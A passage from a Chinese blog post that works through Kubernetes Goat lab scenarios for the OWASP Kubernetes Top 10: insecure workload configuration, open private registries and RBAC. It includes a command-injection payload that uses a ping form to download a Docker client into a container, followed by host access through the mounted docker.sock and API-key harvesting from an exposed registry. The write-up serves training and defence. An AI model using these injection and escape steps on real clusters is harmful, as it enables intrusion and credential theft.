/></p><blockquote><p>这里又出问题了，但是我自己环境的问题，这部分可以忽略。</p><p>执行后我并没有看到出现新的Pod，且端口不可访问，因为原脚本将输出重定向到了null。因此单独执行命令后发现如下问题，目前尚未解决，已发起issue提问：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917221219482.png" /></p></blockquote><p>考虑到这里只是想要转发一个端口，因此我自己重新写了一下这个脚本，换为<code>expose</code>的方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Author: lzwigter&lt;float311@163.com&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This program has been created as part of Kubernetes Goat, but using expose instead of using port-forward,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Kubernetes Goat Access vulnerable infrastructure</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Checking kubectl setup</span></span><br><span class="line">kubectl version --short &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">if [ $? -eq 0 ];</span><br><span class="line">then</span><br><span class="line">    echo &quot;kubectl setup looks good.&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;Please check kubectl setup.&quot;</span><br><span class="line">    exit;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">echo &#x27;Creating service expose for all the Kubernetes Goat resources to locally.&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposing Sensitive keys <span class="keyword">in</span> code bases Scenario</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace default -l <span class="string">&quot;app=build-code&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl port-forward <span class="variable">$POD_NAME</span> --address 0.0.0.0 1230:3000 &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line">kubectl expose deployment build-code-deployment --port 3000 --type=NodePort</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposing DIND (docker-in-docker) exploitation Scenario</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace default -l <span class="string">&quot;app=health-check&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kubectl port-forward <span class="variable">$POD_NAME</span> --address 0.0.0.0 1231:80 &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line">kubectl expose deployment health-check-deployment --port 80  --type=NodePort</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposing SSRF <span class="keyword">in</span> K8S world Scenario</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace default -l <span class="string">&quot;app=internal-proxy&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl port-forward <span class="variable">$POD_NAME</span> --address 0.0.0.0 1232:3000 &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line">kubectl expose deployment internal-proxy-deployment --port 3000 --type=NodePort</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposing Container escape to access host system Scenario</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace default -l <span class="string">&quot;app=system-monitor&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl port-forward <span class="variable">$POD_NAME</span> --address 0.0.0.0 1233:8080 &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line">kubectl expose deployment system-monitor-deployment --port 8080 --type=NodePort</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposing Kubernetes Goat Home</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace default -l <span class="string">&quot;app=kubernetes-goat-home&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl port-forward <span class="variable">$POD_NAME</span> --address 0.0.0.0 1234:80 &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line">kubectl expose deployment kubernetes-goat-home-deployment --port 80 --type=NodePort</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposing Attacking private registry Scenario</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace default -l <span class="string">&quot;app=poor-registry&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl port-forward <span class="variable">$POD_NAME</span> --address 0.0.0.0 1235:5000 &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line">kubectl expose deployment poor-registry-deployment --port 5000 --type=NodePort</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Exposing DoS resources Scenario</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">export</span> POD_NAME=$(kubectl get pods --namespace big-monolith -l <span class="string">&quot;app=hunger-check&quot;</span> -o jsonpath=<span class="string">&quot;&#123;.items[0].metadata.name&#125;&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl --namespace big-monolith port-forward <span class="variable">$POD_NAME</span> --address 0.0.0.0 1236:8080 &gt; /dev/null 2&gt;&amp;1 &amp;</span></span><br><span class="line">kubectl expose deployment hunger-check-deployment -n big-monolith --port 8080 --type=NodePort</span><br><span class="line"></span><br><span class="line">echo &quot;Check kubectl get svc -o wide and  visit app kubernetes-goat-home-deployment&quot;</span><br></pre></td></tr></table></figure><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917221826007.png" /></p><p>上面红框中的home服务为入口：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230917220721962.png" /></p><h1 id="owasp-kubernets-top-10">OWASP Kubernets Top 10</h1><h2 id="k01-insecure-workload-configurations">K01: Insecure WorkloadConfigurations</h2><h3 id="定义">定义</h3><p>OWASP中的定义说明如下：</p><blockquote><p>Kubernetes manifests contain many different configurations that canaffect the reliability, security, and scalability of a given workload.These configurations should be audited and remediated continuously.</p></blockquote><p>其实类似于通常我们使用<code>yaml</code>文件格式来部署deployment、service等资源，因此若这些文件中存在不安全的配置则会导致安全问题，其实感觉比较像OWASPTop 10中的<ahref="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"><strong>A05:2021-SecurityMisconfiguration</strong></a>。</p><p>具体来说OWASP给出了如下例子：</p><ul><li><p>应用不应运行在Root权限（Application processes should not run asroot）</p><p>原因在于，如果这个容器被攻陷了，那么攻击者就拥有了root权限，可以拥有如新建进程的权限。下面是一个错误的示例文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span>  </span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span>  </span><br><span class="line"><span class="attr">metadata:</span>  </span><br><span class="line">  <span class="attr">name:</span> <span class="string">root-user</span></span><br><span class="line"><span class="attr">spec:</span>  </span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line">  <span class="attr">securityContext:</span>  </span><br><span class="line">    <span class="comment">#root user:</span></span><br><span class="line">    <span class="attr">runAsUser:</span> <span class="number">0</span><span class="comment"># 这里将该Pod的用户权限设置为了root</span></span><br><span class="line">    <span class="comment">#non-root user:</span></span><br><span class="line">    <span class="attr">runAsUser:</span> <span class="number">5554</span></span><br></pre></td></tr></table></figure></li><li><p>应使用只读权限（Read-only filesystems should be used）</p><p>为了避免攻击者从失陷容器向主机写入文件，应该使用只读选项，如：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span>  </span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span>  </span><br><span class="line"><span class="attr">metadata:</span>  </span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-only-fs</span></span><br><span class="line"><span class="attr">spec:</span>  </span><br><span class="line">  <span class="attr">containers:</span>  </span><br><span class="line"></span><br><span class="line">  <span class="attr">securityContext:</span>  </span><br><span class="line">    <span class="comment">#read-only fs explicitly defined</span></span><br><span class="line">    <span class="attr">readOnlyRootFilesystem:</span> <span class="literal">true</span><span class="comment"># 打开只读</span></span><br></pre></td></tr></table></figure></li><li><p>禁止使用提权容器（Privileged containers should bedisallowed）</p><p>当容器用户为root且容器自身为提权容器会导致攻击者可以直接访问主机，若非root则会受到一定限制。因此要避免设置为提权容器。错误示例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span>  </span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span>  </span><br><span class="line"><span class="attr">metadata:</span>  </span><br><span class="line">  <span class="attr">name:</span> <span class="string">privileged-pod</span></span><br><span class="line"><span class="attr">spec:</span>  </span><br><span class="line">  <span class="attr">containers:</span>  </span><br><span class="line">  <span class="string">...</span></span><br><span class="line">  <span class="attr">securityContext:</span>  </span><br><span class="line">    <span class="comment">#priviliged </span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment">#non-privileged </span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure></li></ul><h3id="对应k8s-goat场景dind-docker-in-docker-exploitation">对应k8s-goat场景：DIND(docker-in-docker) exploitation</h3><p>下图为官方的攻击场景示意图，初步判断该攻击是利用主机上的docker.sock进行的。</p><blockquote><p>该攻击方法从战术上属于<code>Initial Access</code>，技术上属于<code>Application Vulnerbility</code>。</p></blockquote><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/scenario-2-29ce411f882ff11438dfdd96b7fa45fd.png" /></p><p>下面正式分析，首先访问对应端口：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918193325808.png" /></p><p>这个应用对应的是<code>health-check</code>，根据场景介绍，我们的目标是逃出这个容器并访问所在主机。上帝视角先看一下这个pod的情况：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918193627852.png" /></p><p>位于我集群中第二个节点上。</p><h3 id="预备知识关于docker.sock">预备知识：关于docker.sock</h3><p><code>docker.sock</code>是一个socket文件，我们平常新建容器等用到的docker命令本质上是一个客户端，通过向dockerdaemon发出请求以管理容器。如下图：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/architecture-1695038714046-4.svg" /></p><p>而docker daemon监听的方式也有两种：</p><ul><li>UNIX 域套接字</li><li>TCP 端口监听</li></ul><p>前者会在本地创建一个<code>/var/run/docker.socket</code>，仅用于本机上不同进程之间的网络通信。而后者则支持其他机器的操作。<strong>默认情况下，docker使用的是UNIX域套接字，我们可以使用docker-H参数来进行指定</strong>，如：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918200915674.png" /></p><p>这两条命令结果是一样的，因为默认就是走的本地的UNIX域套接字。当然也可以走TCP，这里访问一下我屋里orangepi上的docker：</p><p>首先使用<code>dockerd -H tcp://0.0.0.0:2375</code>打开一个在2375端口上tcp监听的dockerdaemon</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918202439022.png" /></p><p>可以看到输出也提示了这样的做法是不安全的，然后我们远程连接：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918202542445.png" /></p><p>证明了我们拥有了管理远程机器docker容器的能力。</p><h3 id="利用">利用</h3><p>看一下页面，提供了一个ping的功能：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918194156807.png" /></p><p>Web人说话了，命令注入白？</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918194322450.png" /></p><p>还真是，还是root妈诶。那下面我们就得考虑怎么从这个容器出去了，站在上帝视角上，我们再看看这个pods的详情：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918194715209.png" /></p><p>在详情中我们看到了该容器挂载了所在主机的<code>/var/run/docker.sock</code>。在前述预备知识下，这里就知道了要利用docker.sock的作用以及<code>docker -H</code>。</p><p>回到网页，我们先用<code>mount</code>命令查看挂载内容判断是否存在<code>docker.sock</code>。</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918203512342.png" /></p><p>可以看到UNIX域套接字的socket，但是当前容器中没有安装docker客户端：</p><p><img src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918204405720.png" style="zoom:60%;" /></p><p>Ok点题了，所以叫DIND，我们得给这个容器里下一个客户端了。官方提供了下载列表供我们直接使用：<code>https://download.docker.com/linux/static/stable/x86_64/</code>。因此分别执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载客户端</span></span><br><span class="line">; wget https://download.docker.com/linux/static/stable/x86_64/docker-24.0.6.tgz -O /home/docker.tgz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压使用</span></span><br><span class="line">; tar -zvxf /home/docker.tgz -C /home/</span><br></pre></td></tr></table></figure><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918205332118.png" /></p><p><img src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918205420522.png" style="zoom:60%;" /></p><p>然后我们就可以使用那个挂载的socket了：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918205650826.png" /></p><p>到这里结束，我们就获得了运行该容器的主机上的所有运行容器，完成了一定的<strong>信息收集</strong>。并可根据此进一步去访问其他容器资源。</p><h3 id="问题原因">问题原因</h3><p>从该deployment的配置文件中就可以看到，能出现这个问题本质原因就在于该容器是提权了的。此外也没有对主机文件访问做可读限制，导致了我们可以下载一个docker客户端，从而完成DIND攻击。</p><p><img src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918210321217.png" style="zoom:50%;" /></p><h3 id="参考学习">参考学习</h3><ul><li><ahref="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-2/docker-in-docker-exploitation-in-kubernetes-containers/welcome">⎈DIND (docker-in-docker) exploitation | Kubernetes Goat(madhuakula.com)</a></li><li><ahref="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K01-insecure-workload-configurations">K01:Insecure Workload Configurations | OWASP Foundation</a></li><li><ahref="https://www.cnblogs.com/mrxccc/p/16504719.html">Docker系列-docker.sock探究- 狮子挽歌丿 - 博客园 (cnblogs.com)</a></li></ul><h2 id="k02-supply-chain-vulnerabilities">K02: Supply ChainVulnerabilities</h2><h3 id="定义-1">定义</h3><p>这个之前有听过类似的名词：<strong>镜像投毒</strong>，这个攻击也是类似的。由于容器由大量的第三方组件组成，因此这些组件若有问题，那么这个容器就存在失陷的风险。</p><p>官方给了三个类型：</p><ul><li><p>镜像完整性（Image Integrity）：</p><blockquote><p>Software provenance has recently attracted significant attention inthe media due to events such as the <ahref="https://www.businessinsider.com/solarwinds-hack-explained-government-agencies-cyber-security-2020-12">Solarwindsbreach</a> and a variety of <ahref="https://therecord.media/malware-found-in-npm-package-with-millions-of-weekly-downloads/">taintedthird-party packages</a>. These supply chain risks can surface invarious states of the container build cycle as well as at runtime insideof Kubernetes. When systems of record do not exist regarding thecontents of a container image it is possible that an unexpectedcontainer may run in a cluster.</p></blockquote><p>即源镜像被污染了，比如上面提到的例子，npm包中被插入了恶意代码。</p></li><li><p>镜像组成（Image Composition）：</p><blockquote><p>A container image consists of layers, each of which can presentsecurity implications. A properly constructed container image not onlyreduces attack surface, but can also increase deployment efficiency.Images with extraneous software can be leveraged to elevate privilegesor exploit known vulnerabilities.</p></blockquote><p>这里感觉更多说的镜像由多个不同的部分组成，比如os、软件等，组成越复杂，其攻击面、可利用的可能性越大。因此我们要尽量精简化，如使用最小化的OS，目的是降低攻击面。</p></li><li><p>已知软件漏洞（Known Software Vulnerabilities）：</p><blockquote><p>Due to their extensive use of third-party packages, many containerimages are inherently dangerous to pull into a trusted environment andrun. For example, if a given layer in an image contains a version ofOpenSSL that is susceptible to a known exploit it may be propagated toseveral workloads and unknowingly put an entire cluster at risk.</p></blockquote><p>即镜像中使用了有漏洞的第三方包，比如OpenSSL有问题等。已经有了一些扫描容器镜像的工具如<ahref="https://github.com/coreos/clair">Clair</a> and <ahref="https://github.com/aquasecurity/trivy">trivy</a></p></li></ul><h3id="对应k8s-goat场景attacking-private-registry">对应k8s-goat场景：Attackingprivate registry</h3><p>下图为官方的攻击场景示意图，初步判断该攻击是对该容器所依赖的上游镜像进行了篡改。</p><blockquote><p>该攻击方法从战术上属于<code>Initial Access</code>，技术上属于<code>Compromised image in registry</code>。</p></blockquote><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/scenario-7-fbcf2b81257e7185ddfa569b9089e34d-1695046803656-11.png" /></p><p>下面正式分析，首先访问对应端口：</p><figure><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230918222854330.png"alt="image-20230918222854330" /><figcaption aria-hidden="true">image-20230918222854330</figcaption></figure><p>这个应用对应的是<code>poor-registry</code>，根据场景介绍，我们的目标是寻找一个<code>k8s-goat-</code>开头的flag。</p><h3 id="预备知识关于docker-registry">预备知识：关于docker registry</h3><p>dockerregistry是用来存放docker镜像的地方，有公开的，也有私有的。公开的如<ahref="https://hub.docker.com/">DockerHub</a>，私人的比如阿里云控制台可以管理的个人实例。还是那个图，最右侧就是dockerregistry服务：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/architecture-1695038714046-4.svg" /></p><p>对于私有的镜像，我们也可以自己搭建一个私有的registry服务，通常运行在5000端口上。搭建完成后我们就可以通过<code>pull</code>、<code>push</code>等命令管理该registry上的私有镜像。</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230919103226887.png" /></p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230919103344035.png" /></p><p>此外，该服务提供了docekr服务端提供的RESTful风格的接口，使用方法官方文档：<ahref="https://docs.docker.com/registry/spec/api/">HTTP API V2 | DockerDocs</a>。</p><h3 id="利用-1">利用</h3><p>打开页面，我们访问<code>/v2</code>，返回200则说明是支持v2版本的API的：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230919104909189.png" /></p><p>我们可以利用API接口列出所有镜像：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230919104855799.png" /></p><p>我们分别读取这两个镜像的<code>manifest</code>文件以收集信息：</p><p><imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230919105703471.png" /></p><p>没什么特别的信息，查看另一个： <imgsrc="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230919110020593.png" /></p><p>可以看到有<code>API_KEY</code>信息，即题目的flag。</p><h3 id="问题原因-1">问题原因</h3><p>由于该私有镜像源是开放的，因而我们可以列举已有镜像的信息，从而获得一些隐私信息，如配置过程中的KEY、软件版本等等。此外，我们也可以上传一个同名的镜像以实现供应链攻击。因此我们也要保护私有镜像源的安全性，防止供应链攻击。</p><h3 id="参考学习-1">参考学习</h3><ul><li><ahref="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-7/attacking-private-container-registry-in-kubernetes/welcome/">⎈Attacking private registry | Kubernetes Goat (madhuakula.com)</a></li><li><a href="https://docs.docker.com/registry/spec/api/">HTTP API V2 |Docker Docs</a></li><li><ahref="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K02-supply-chain-vulnerabilities">K02:Supply Chain Vulnerabilities | OWASP Foundation</a></li></ul><h2 id="k03-overly-permissive-rbac">K03: Overly Permissive RBAC</h2><h3 id="定义-2">定义</h3><p>其实就是过度授权，老生常谈的问题只不过是新的场景——K8S中的RBAC（Role-BasedAccess Control）。K8S将资源（Pod、Service、Nodes等）和动作（get、create、delete等）绑定起来，并划分得到不同的角色身份，以此来控制权限。</p><blockquote><p>Configuring RBAC with least privilege enforcement is a challenge forreasons we will explore below.</p></blockquote><p>那这件事困难吗？从OWASP给的解释来看，我认为困难点在于资源数量的庞大因而导致了配置的困难：</p><blockquote><p>RBAC is an extremely powerful security enforcement mechanism inKubernetes when appropriately configured but can quickly become amassive risk to the cluster and increase the blast radius in the eventof a compromise.</p></blockquote><p>为了了解这部分内容，首先需要了解K8S中的RBAC。K8S的RBAC定义了四种对象：</p><ul><li>Role</li><li>ClusterRole</li><li>RoleBinding</li><li>ClusterRoleBinding</li></ul><p>其中，前两个<code>xxxRole</code>包含了<strong>“允许”</strong>执行的操作内容（可以理解为“操作白名单”）。区别从名字大概也能判断出来：</p><ul><li><code>Role</code>必须定义在一个<code>Namespace</code>中，而<code>ClusterRole</code>则在整个集群中通用，因而不属于任何<code>Namespace</code>。</li><li><code>ClusterRole</code>可以用于定义对Namespace资源（如Pods）、集群范围资源（如Node）、endpoint（如HTTPAPI接口）的权限，并授予其他单个命名空间和跨命名空间的访问权限；而<code>Role</code>则只作用于单个<code>Namespace</code>。</li></ul><p>如下是官方给的<code>Role</code>和<code>ClusterRole</code>例子：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span><span class="comment"># 定义了一个可以访问Pods信息的Role角色</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-reader</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>] <span class="comment"># &quot;&quot; indicates the core API group</span></span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;pods&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;list&quot;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span><span class="comment"># 定义了一个可以访问`secrets`的ClusterRole角色</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="comment"># &quot;namespace&quot; omitted since ClusterRoles are not namespaced</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-reader</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># at the HTTP level, the name of the resource for accessing Secret</span></span><br><span class="line">  <span class="comment"># objects is &quot;secrets&quot;</span></span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;secrets&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;list&quot;</span>]</span><br></pre></td></tr></table></figure><p>有了两个身份后，我们还有<code>RoleBinding</code>和<code>ClusterRoleBinding</code>可以基于前述两个身份对象，绑定到一个或多个用户，这样他们就拥有了对应的权限。二者区别在于前者用于授权一个<code>Namespace</code>范畴的权限，而后者可以授权整个集群范围内的。</p><p>官方也给出了例子：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="comment"># This role binding allows &quot;jane&quot; to read pods in the &quot;default&quot; namespace.</span></span><br><span class="line"><span class="comment"># You need to already have a Role named &quot;pod-reader&quot; in that namespace.</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-pods</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="comment"># You can specify more than one &quot;subject&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">jane</span> <span class="comment"># &quot;name&quot; is case sensitive</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="comment"># &quot;roleRef&quot; specifies the binding to a Role / ClusterRole</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span> <span class="comment">#this must be Role or ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-reader</span> <span class="comment"># this must match the name of the Role or ClusterRole you wish to bind to</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: 